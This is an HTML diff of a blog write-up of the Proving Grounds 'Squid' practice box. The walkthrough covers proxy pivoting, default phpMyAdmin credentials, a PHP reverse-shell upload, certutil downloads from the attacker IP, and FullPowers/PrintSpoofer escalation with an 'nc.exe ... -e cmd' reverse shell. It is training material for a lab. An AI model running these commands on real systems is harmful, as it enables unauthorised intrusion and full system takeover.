+<p>Squid is a caching and forwarding HTTP web proxy. It reduces bandwidth and improves response times by <strong>caching</strong> and reusing frequently-requested web pages.</p>
+
+<p>This is the squid repo https://github.com/squid-cache/squid</p>
+
+<p>I was searching in the GitHub, etc., but nothing worked. So i decided to try this:</p>
+
+<p><a href="https://book.hacktricks.xyz/network-services-pentesting/3128-pentesting-squid">https://book.hacktricks.xyz/network-services-pentesting/3128-pentesting-squid</a></p>
+
+<ul>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">curl --proxy http://192.168.217.189:3128 http://192.168.45.227</code> →  <em>Directory Listening in my own machine</em></p>
+
+    <p><a href="/../assets/img/oscp/Squid/Untitled%203.png" class="popup img-link  shimmer"><img src="/../assets/img/oscp/Squid/Untitled%203.png" alt="Untitled" loading="lazy"></a></p>
+  </li>
+</ul>
+
+<p>So after a while i decided to try this tool https://github.com/aancw/spose.git</p>
+
+<ul>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">python spose.py --proxy http://192.168.45.227:3128 --target 192.168.45.227</code></p>
+
+    <p><a href="/../assets/img/oscp/Squid/Untitled%204.png" class="popup img-link  shimmer"><img src="/../assets/img/oscp/Squid/Untitled%204.png" alt="Untitled" loading="lazy"></a></p>
+  </li>
+</ul>
+
+<p>Ok, verifying if it’s an web page running in 8080</p>
+
+<ul>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">curl --proxy http://192.168.217.189:3128 http://192.168.217.189:8080</code></p>
+
+    <p><a href="/../assets/img/oscp/Squid/Untitled%205.png" class="popup img-link  shimmer"><img src="/../assets/img/oscp/Squid/Untitled%205.png" alt="Untitled" loading="lazy"></a></p>
+  </li>
+</ul>
+
+<p>Now setting up an http proxy with the extension Proxy Switcher <a href="https://chrome.google.com/webstore/detail/proxy-switcher-and-manage/onnfghpihccifgojkpnnncpagjcdbjod?ref=benheater.com">https://chrome.google.com/webstore/detail/proxy-switcher-and-manage/onnfghpihccifgojkpnnncpagjcdbjod?ref=benheater.com</a></p>
+
+<ul>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">proxy swithcer</code></p>
+
+    <p><a href="/../assets/img/oscp/Squid/Untitled%206.png" class="popup img-link  shimmer"><img src="/../assets/img/oscp/Squid/Untitled%206.png" alt="Untitled" loading="lazy"></a></p>
+  </li>
+</ul>
+
+<p>And now trying to access it</p>
+
+<ul>
+  <li>
+    <p><a href="http://192.168.237.189:8080/">http://192.168.237.189:8080/</a> → It’s a WampServer 3.2.3 - 64bit</p>
+
+    <p><a href="/../assets/img/oscp/Squid/Untitled%207.png" class="popup img-link  shimmer"><img src="/../assets/img/oscp/Squid/Untitled%207.png" alt="Untitled" loading="lazy"></a></p>
+  </li>
+  <li>
+    <p><a href="http://192.168.237.189:8080/phpsysinfo/index.php?disp=bootstrap">http://192.168.237.189:8080/phpsysinfo/index.php?disp=bootstrap</a></p>
+
+    <p><a href="/../assets/img/oscp/Squid/Untitled%208.png" class="popup img-link  shimmer"><img src="/../assets/img/oscp/Squid/Untitled%208.png" alt="Untitled" loading="lazy"></a></p>
+  </li>
+  <li>
+    <p><a href="http://192.168.237.189:8080/phpmyadmin/index.php">http://192.168.237.189:8080/phpmyadmin/index.php</a> → login panel MySQL - tried default creds (root:)</p>
+
+    <p><a href="/../assets/img/oscp/Squid/Untitled%209.png" class="popup img-link  shimmer"><img src="/../assets/img/oscp/Squid/Untitled%209.png" alt="Untitled" loading="lazy"></a></p>
+
+    <p><a href="/../assets/img/oscp/Squid/Untitled%2010.png" class="popup img-link  shimmer"><img src="/../assets/img/oscp/Squid/Untitled%2010.png" alt="Untitled" loading="lazy"></a></p>
+  </li>
+</ul>
+
+<p>Verifying some documentation about phpMyAdmin…</p>
+
+<p><a href="https://www.hackingarticles.in/shell-uploading-web-server-phpmyadmin/">https://www.hackingarticles.in/shell-uploading-web-server-phpmyadmin/</a></p>
+
+<p><a href="https://gist.github.com/BababaBlue/71d85a7182993f6b4728c5d6a77e669f">https://gist.github.com/BababaBlue/71d85a7182993f6b4728c5d6a77e669f</a></p>
+
+<ul>
+  <li>
+    <p><a href="http://192.168.237.189:8080/phpmyadmin/db_sql.php?db=hendrich_schema">http://192.168.237.189:8080/phpmyadmin/db_sql.php?db=hendrich_schema</a></p>
+
+    <p><a href="/../assets/img/oscp/Squid/Untitled%2011.png" class="popup img-link  shimmer"><img src="/../assets/img/oscp/Squid/Untitled%2011.png" alt="Untitled" loading="lazy"></a></p>
+
+    <p><a href="/../assets/img/oscp/Squid/Untitled%2012.png" class="popup img-link  shimmer"><img src="/../assets/img/oscp/Squid/Untitled%2012.png" alt="Untitled" loading="lazy"></a></p>
+  </li>
+  <li>
+    <p><a href="http://192.168.237.189:8080/uploader.php">http://192.168.237.189:8080/uploader.php</a></p>
+
+    <p><a href="/../assets/img/oscp/Squid/Untitled%2013.png" class="popup img-link  shimmer"><img src="/../assets/img/oscp/Squid/Untitled%2013.png" alt="Untitled" loading="lazy"></a></p>
+  </li>
+</ul>
+
+<p>Reverse shell must be for windows</p>
+
+<p><a href="https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php">https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php</a></p>
+
+<ul>
+  <li><a href="http://192.168.237.189:8080/php_reverse_shell.php">http://192.168.237.189:8080/php_reverse_shell.php</a></li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">sudo  rlwrap nc -lvnp 80</code> → Nt authorithy</p>
+
+    <p><a href="/../assets/img/oscp/Squid/Untitled%2014.png" class="popup img-link  shimmer"><img src="/../assets/img/oscp/Squid/Untitled%2014.png" alt="Untitled" loading="lazy"></a></p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">flag</code></p>
+
+    <p><a href="/../assets/img/oscp/Squid/Untitled%2015.png" class="popup img-link  shimmer"><img src="/../assets/img/oscp/Squid/Untitled%2015.png" alt="Untitled" loading="lazy"></a></p>
+  </li>
+</ul>
+
+<h2 id="priv-escalation"><span class="me-2">Priv Escalation</span><a href="#priv-escalation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+
+<hr />
+
+<p>The first thing that i want to do is revoke all firewalls. I’ve tried but the user don’t have permission.</p>
+
+<p>So after a while i decided to put winPEAS inside the machine</p>
+
+<ul>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">certutil.exe -urlcache -f http://192.168.45.227/winPEASx64.exe winPEASx64.exe</code></p>
+
+    <p><a href="/../assets/img/oscp/Squid/Untitled%2016.png" class="popup img-link  shimmer"><img src="/../assets/img/oscp/Squid/Untitled%2016.png" alt="Untitled" loading="lazy"></a></p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">winPEASx64.exe</code> → <em>Apparently</em> <a href="https://exploit-db.com/exploits/46718">https://exploit-db.com/exploits/46718</a> <em>- CVE-2019-0836</em> <a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/leaked-handle-exploitation">https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/leaked-handle-exploitation</a></p>
+
+    <p><a href="/../assets/img/oscp/Squid/Untitled%2017.png" class="popup img-link  shimmer"><img src="/../assets/img/oscp/Squid/Untitled%2017.png" alt="Untitled" loading="lazy"></a></p>
+
+    <p><a href="/../assets/img/oscp/Squid/Untitled%2018.png" class="popup img-link  shimmer"><img src="/../assets/img/oscp/Squid/Untitled%2018.png" alt="Untitled" loading="lazy"></a></p>
+
+    <p><a href="/../assets/img/oscp/Squid/Untitled%2019.png" class="popup img-link  shimmer"><img src="/../assets/img/oscp/Squid/Untitled%2019.png" alt="Untitled" loading="lazy"></a></p>
+
+    <p><a href="/../assets/img/oscp/Squid/Untitled%2020.png" class="popup img-link  shimmer"><img src="/../assets/img/oscp/Squid/Untitled%2020.png" alt="Untitled" loading="lazy"></a></p>
+  </li>
+</ul>
+
+<p>Ok, nothing worked, but after enumerate, and after i saw that i was an nt authority but with “local service’</p>
+
+<ul>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">whoami</code></p>
+
+    <p><a href="/../assets/img/oscp/Squid/Untitled%2021.png" class="popup img-link  shimmer"><img src="/../assets/img/oscp/Squid/Untitled%2021.png" alt="Untitled" loading="lazy"></a></p>
+  </li>
+</ul>
+
+<p>I found this <a href="https://itm4n.github.io/localservice-privileges/?ref=benheater.com">https://itm4n.github.io/localservice-privileges/?ref=benheater.com</a> After read the article i found that he did an script <a href="https://github.com/itm4n/FullPowers/releases">https://github.com/itm4n/FullPowers/releases</a></p>
+
+<ul>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">certutil.exe -urlcache -f http://192.168.45.227/FullPowers.exe FullPowers.exe</code></p>
+
+    <p><a href="/../assets/img/oscp/Squid/Untitled%2022.png" class="popup img-link  shimmer"><img src="/../assets/img/oscp/Squid/Untitled%2022.png" alt="Untitled" loading="lazy"></a></p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">FullPowers.exe -c "C:\Users\Public\Documents\nc.exe 192.168.45.227 4430 -e cmd" -z</code>
+<code class="language-plaintext highlighter-rouge">sudo rlwrap nc -lvnp 4430</code></p>
+
+    <p><a href="/../assets/img/oscp/Squid/Untitled%2023.png" class="popup img-link  shimmer"><img src="/../assets/img/oscp/Squid/Untitled%2023.png" alt="Untitled" loading="lazy"></a></p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">whoami /priv</code> → Now i’ve SeImpersoantePrivilage enabled</p>
+
+    <p><a href="/../assets/img/oscp/Squid/Untitled%2024.png" class="popup img-link  shimmer"><img src="/../assets/img/oscp/Squid/Untitled%2024.png" alt="Untitled" loading="lazy"></a></p>
+  </li>
+</ul>
+
+<p>So i’ll use the https://github.com/itm4n/PrintSpoofer/releases</p>
+
+<ul>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">certutil.exe -urlcache -f http://192.168.45.227/PrintSpoofer64.exe PrintSpoofer64.exe</code></p>
+
+    <p><a href="/../assets/img/oscp/Squid/Untitled%2025.png" class="popup img-link  shimmer"><img src="/../assets/img/oscp/Squid/Untitled%2025.png" alt="Untitled" loading="lazy"></a></p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">PrintSpoofer64.exe -i -c cmd</code> → Priv escalado</p>
+
+    <p><a href="/../assets/img/oscp/Squid/Untitled%2026.png" class="popup img-link  shimmer"><img src="/../assets/img/oscp/Squid/Untitled%2026.png" alt="Untitled" loading="lazy"></a></p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">flag</code></p>
+
+    <p><a href="/../assets/img/oscp/Squid/Untitled%2027.png" class="popup img-link  shimmer"><img src="/../assets/img/oscp/Squid/Untitled%2027.png" alt="Untitled" loading="lazy"></a></p>
+  </li>
+</ul>
+
+  </div>
+
+  <div class="post-tail-wrapper text-muted">
+    <!-- categories -->
+    
+    <div class="post-meta mb-3">
+      <i class="far fa-folder-open fa-fw me-1"></i>
+      
+      <a href="/categories/proving-grounds/">Proving Grounds</a>,
+      <a href="/categories/easy/">Easy</a>
+    </div>
+    
+
+    <!-- tags -->
+    
+    <div class="post-tags">
+      <i class="fa fa-tags fa-fw me-1"></i>
+      
+      <a href="/tags/windows/" class="post-tag no-text-decoration">Windows</a>
+      
+      <a href="/tags/web/" class="post-tag no-text-decoration">Web</a>
+      
+      <a href="/tags/squid/" class="post-tag no-text-decoration">Squid</a>
+      
+      <a href="/tags/oscp/" class="post-tag no-text-decoration">OSCP</a>
+      
+    </div>
+    
+
+    <div class="
         post-tail-bottom
         d-flex justify-content-between align-items-center mt-5 pb-2
       ">
-                <div class="license-wrapper">
-
-
-
-                  This post is licensed under
-                  <a href="https://creativecommons.org/licenses/by/4.0/">
-                    CC BY 4.0
-                  </a>
-                  by the author.
-
-                </div>
-
-                <!-- Post sharing snippet -->
-
-                <div class="share-wrapper d-flex align-items-center">
-                  <span class="share-label text-muted">Share</span>
-                  <span class="share-icons">
-
-
-
-
-
-
-
-
-                    <a href="https://twitter.com/intent/tweet?text=Proving%20Grounds%20-%20Squid%20-%20&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FProving-Grounds-Squid%2F"
-                      target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter"
-                      aria-label="Twitter">
-                      <i class="fa-fw fa-brands fa-square-x-twitter"></i>
-                    </a>
-
-
-
-
-                    <a href="https://www.facebook.com/sharer/sharer.php?title=Proving%20Grounds%20-%20Squid%20-%20&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FProving-Grounds-Squid%2F"
-                      target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook"
-                      aria-label="Facebook">
-                      <i class="fa-fw fab fa-facebook-square"></i>
-                    </a>
-
-
-
-
-                    <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FProving-Grounds-Squid%2F&text=Proving%20Grounds%20-%20Squid%20-%20"
-                      target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram"
-                      aria-label="Telegram">
-                      <i class="fa-fw fab fa-telegram"></i>
-                    </a>
-
-
-                    <button id="copy-link" aria-label="Copy link" class="btn small" data-bs-toggle="tooltip"
-                      data-bs-placement="top" title="Copy link" data-title-succeed="Link copied successfully!">
-                      <i class="fa-fw fas fa-link pe-none fs-6"></i>
-                    </button>
-                  </span>
-                </div>
-
-              </div>
-              <!-- .post-tail-bottom -->
-            </div>
-            <!-- div.post-tail-wrapper -->
-          </article>
-
-
-        </main>
-
-        <!-- panel -->
-        <aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 mb-5 text-muted">
-          <div class="access">
-            <!-- Get 5 last posted/updated posts -->
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-            <section id="access-lastmod">
-              <h2 class="panel-heading">Recently Updated</h2>
-              <ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2">
-
-
-
-
-                <li class="text-truncate lh-lg">
-                  <a href="/posts/Proving-Grounds-ClamAV/">Proving Grounds - ClamAV</a>
-                </li>
-
-
-
-
-                <li class="text-truncate lh-lg">
-                  <a href="/posts/Proving-Grounds-Exfiltrated/">Proving Grounds - Exfiltrated</a>
-                </li>
-
-
-
-
-                <li class="text-truncate lh-lg">
-                  <a href="/posts/Proving-Grounds-Twiggy/">Proving Grounds - Twiggy</a>
-                </li>
-
-
-
-
-                <li class="text-truncate lh-lg">
-                  <a href="/posts/Proving-Grounds-Squid/">Proving Grounds - Squid</a>
-                </li>
-
-
-
-
-                <li class="text-truncate lh-lg">
-                  <a href="/posts/Proving-Grounds-Fractal/">Proving Grounds - Fractal</a>
-                </li>
-
-              </ul>
-            </section>
-            <!-- #access-lastmod -->
-
-
-            <!-- The trending tags list -->
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-            <section>
-              <h2 class="panel-heading">Trending Tags</h2>
-              <div class="d-flex flex-wrap mt-3 mb-1 me-3">
-
-
-                <a class="post-tag btn btn-outline-primary" href="/tags/oscp/">OSCP</a>
-
-
-                <a class="post-tag btn btn-outline-primary" href="/tags/linux/">Linux</a>
-
-
-                <a class="post-tag btn btn-outline-primary" href="/tags/web/">Web</a>
-
-
-                <a class="post-tag btn btn-outline-primary" href="/tags/clamav-milter/">ClamAV-Milter</a>
-
-
-                <a class="post-tag btn btn-outline-primary" href="/tags/exiftool/">Exiftool</a>
-
-
-                <a class="post-tag btn btn-outline-primary" href="/tags/mysql/">MySQL</a>
-
-
-                <a class="post-tag btn btn-outline-primary" href="/tags/saltstack/">SaltStack</a>
-
-
-                <a class="post-tag btn btn-outline-primary" href="/tags/snmp/">SNMP</a>
-
-
-                <a class="post-tag btn btn-outline-primary" href="/tags/squid/">Squid</a>
-
-
-                <a class="post-tag btn btn-outline-primary" href="/tags/subrion/">Subrion</a>
-
-              </div>
-            </section>
-
-
-          </div>
-
-
-
-
-
-
-
-          <section id="toc-wrapper" class="d-none ps-0 pe-4">
-            <h2 class="panel-heading ps-3 mb-2">Contents</h2>
-            <nav id="toc"></nav>
-          </section>
-
-
-
-        </aside>
+      <div class="license-wrapper">
+        
+        
+
+        This post is licensed under 
+        <a href="https://creativecommons.org/licenses/by/4.0/">
+          CC BY 4.0
+        </a>
+         by the author.
+        
       </div>
 
-      <div class="row">
-        <!-- tail -->
-        <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4">
-
-
-          <!-- Recommend the other 3 posts according to the tags and categories of the current post. -->
-
-          <!-- The total size of related posts -->
-
-
-          <!-- An random integer that bigger than 0 -->
-
-
-          <!-- Equals to TAG_SCORE / {max_categories_hierarchy} -->
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-          <aside id="related-posts" aria-labelledby="related-label">
-            <h3 class="mb-4" id="related-label">Further Reading</h3>
-            <nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4">
-
-              <article class="col">
-                <a href="/posts/Proving-Grounds-Exfiltrated/" class="post-preview card h-100">
-                  <div class="card-body">
-                    <!--
-  Date format snippet
-  See: ${JS_ROOT}/utils/locale-dateime.js
--->
-
-
-
-
-                    <time data-ts="1720839600" data-df="ll">
-                      Jul 13, 2024
-                    </time>
-
-                    <h4 class="pt-0 my-2">Proving Grounds - Exfiltrated</h4>
-                    <div class="text-muted">
-                      <p>Exfiltrated was a well-structured box that provided an excellent opportunity to exploit a
-                        Subrion CMS vulnerability and perform privilege escalation via an Exiftool exploit.
-
-                        Initial enumeration le...</p>
-                    </div>
-                  </div>
-                </a>
-              </article>
-
-              <article class="col">
-                <a href="/posts/Proving-Grounds-Twiggy/" class="post-preview card h-100">
-                  <div class="card-body">
-                    <!--
-  Date format snippet
-  See: ${JS_ROOT}/utils/locale-dateime.js
--->
-
-
-
-
-                    <time data-ts="1720753200" data-df="ll">
-                      Jul 12, 2024
-                    </time>
-
-                    <h4 class="pt-0 my-2">Proving Grounds - Twiggy</h4>
-                    <div class="text-muted">
-                      <p>Twiggy was an insightful machine focused on exploiting a SaltStack vulnerability.
-
-                        The machine required initial enumeration to identify open services, followed by a specific focus
-                        on the web servic...</p>
-                    </div>
-                  </div>
-                </a>
-              </article>
-
-              <article class="col">
-                <a href="/posts/Proving-Grounds-Fractal/" class="post-preview card h-100">
-                  <div class="card-body">
-                    <!--
-  Date format snippet
-  See: ${JS_ROOT}/utils/locale-dateime.js
--->
-
-
-
-
-                    <time data-ts="1720580400" data-df="ll">
-                      Jul 10, 2024
-                    </time>
-
-                    <h4 class="pt-0 my-2">Proving Grounds - Fractal</h4>
-                    <div class="text-muted">
-                      <p>Fractal was an extremely useful box to learn and train my MySQL skills. It starts with
-                        identifying a Symfony CMS through HTTP enumeration.
-
-                        The Symfony profiler was explored, leading to finding sen...</p>
-                    </div>
-                  </div>
-                </a>
-              </article>
-
-            </nav>
-          </aside>
-          <!-- #related-posts -->
-
-
-
-
-          <!-- Navigation buttons at the bottom of the post. -->
-
-          <nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation">
-
-
-
-
-            <a href="/posts/Proving-Grounds-Fractal/" class="btn btn-outline-primary" aria-label="Older">
-              <p>Proving Grounds - Fractal</p>
-            </a>
-
-
-
-            <a href="/posts/Proving-Grounds-Twiggy/" class="btn btn-outline-primary" aria-label="Newer">
-              <p>Proving Grounds - Twiggy</p>
-            </a>
-
-          </nav>
-
-
-
-          <!-- The comments switcher -->
-
-
-
-
-          <!-- The Footer -->
-
-          <footer aria-label="Site Info"
-            class="d-flex flex-column justify-content-center text-muted flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3">
-            <p>
-              © <time>2024</time>
-
-
-              <a href="https://github.com/arthurhendrich">H3NDR1CH</a>.
-              <span data-bs-toggle="tooltip" data-bs-placement="top"
-                title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some
-                rights reserved.</span>
-
-            </p>
-          </footer>
-
-        </div>
-      </div>
-
-      <!-- The Search results -->
-
-      <div id="search-result-wrapper" class="d-flex justify-content-center d-none">
-        <div class="col-11 content">
-          <div id="search-hints">
-            <!-- The trending tags list -->
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-            <section>
-              <h2 class="panel-heading">Trending Tags</h2>
-              <div class="d-flex flex-wrap mt-3 mb-1 me-3">
-
-
-                <a class="post-tag btn btn-outline-primary" href="/tags/oscp/">OSCP</a>
-
-
-                <a class="post-tag btn btn-outline-primary" href="/tags/linux/">Linux</a>
-
-
-                <a class="post-tag btn btn-outline-primary" href="/tags/web/">Web</a>
-
-
-                <a class="post-tag btn btn-outline-primary" href="/tags/clamav-milter/">ClamAV-Milter</a>
-
-
-                <a class="post-tag btn btn-outline-primary" href="/tags/exiftool/">Exiftool</a>
-
-
-                <a class="post-tag btn btn-outline-primary" href="/tags/mysql/">MySQL</a>
-
-
-                <a class="post-tag btn btn-outline-primary" href="/tags/saltstack/">SaltStack</a>
-
-
-                <a class="post-tag btn btn-outline-primary" href="/tags/snmp/">SNMP</a>
-
-
-                <a class="post-tag btn btn-outline-primary" href="/tags/squid/">Squid</a>
-
-
-                <a class="post-tag btn btn-outline-primary" href="/tags/subrion/">Subrion</a>
-
-              </div>
-            </section>
-
-
-          </div>
-          <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
-        </div>
-      </div>
+      <!-- Post sharing snippet -->
+
+<div class="share-wrapper d-flex align-items-center">
+  <span class="share-label text-muted">Share</span>
+  <span class="share-icons">
+    
+    
+    
+
+    
+
+      
+
+      <a href="https://twitter.com/intent/tweet?text=Proving%20Grounds%20-%20Squid%20-%20&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FProving-Grounds-Squid%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter">
+        <i class="fa-fw fa-brands fa-square-x-twitter"></i>
+      </a>
+    
+
+      
+
+      <a href="https://www.facebook.com/sharer/sharer.php?title=Proving%20Grounds%20-%20Squid%20-%20&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FProving-Grounds-Squid%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
+        <i class="fa-fw fab fa-facebook-square"></i>
+      </a>
+    
+
+      
+
+      <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FProving-Grounds-Squid%2F&text=Proving%20Grounds%20-%20Squid%20-%20" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
+        <i class="fa-fw fab fa-telegram"></i>
+      </a>
+    
+
+    <button
+      id="copy-link"
+      aria-label="Copy link"
+      class="btn small"
+      data-bs-toggle="tooltip"
+      data-bs-placement="top"
+      title="Copy link"
+      data-title-succeed="Link copied successfully!"
+    >
+      <i class="fa-fw fas fa-link pe-none fs-6"></i>
+    </button>
+  </span>
+</div>
 
     </div>
-
-    <aside aria-label="Scroll to Top">
-      <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow">
-        <i class="fas fa-angle-up"></i>
-      </button>
-    </aside>
+    <!-- .post-tail-bottom -->
   </div>
+  <!-- div.post-tail-wrapper -->
+</article>
 
-  <div id="mask"></div>
+            
+          </main>
+
+          <!-- panel -->
+          <aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 mb-5 text-muted">
+            <div class="access">
+              <!-- Get 5 last posted/updated posts -->
 
 
-  <aside id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-bs-animation="true"
-    data-bs-autohide="false">
-    <div class="toast-header">
-      <button type="button" class="btn-close ms-auto" data-bs-dismiss="toast" aria-label="Close"></button>
+
+
+
+
+
+
+
+
+
+
+
+
+  <section id="access-lastmod">
+    <h2 class="panel-heading">Recently Updated</h2>
+    <ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2">
+      
+        
+        
+        
+        <li class="text-truncate lh-lg">
+          <a href="/posts/Hack-The-Box-Conceal/">Hack The Box - Conceal</a>
+        </li>
+      
+        
+        
+        
+        <li class="text-truncate lh-lg">
+          <a href="/posts/Hack-The-Box-Surveillance/">Hack The Box - Surveillance</a>
+        </li>
+      
+        
+        
+        
+        <li class="text-truncate lh-lg">
+          <a href="/posts/Proving-Grounds-ClamAV/">Proving Grounds - ClamAV</a>
+        </li>
+      
+        
+        
+        
+        <li class="text-truncate lh-lg">
+          <a href="/posts/Proving-Grounds-Exfiltrated/">Proving Grounds - Exfiltrated</a>
+        </li>
+      
+        
+        
+        
+        <li class="text-truncate lh-lg">
+          <a href="/posts/Proving-Grounds-Twiggy/">Proving Grounds - Twiggy</a>
+        </li>
+      
+    </ul>
+  </section>
+  <!-- #access-lastmod -->
+
+
+              <!-- The trending tags list -->
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
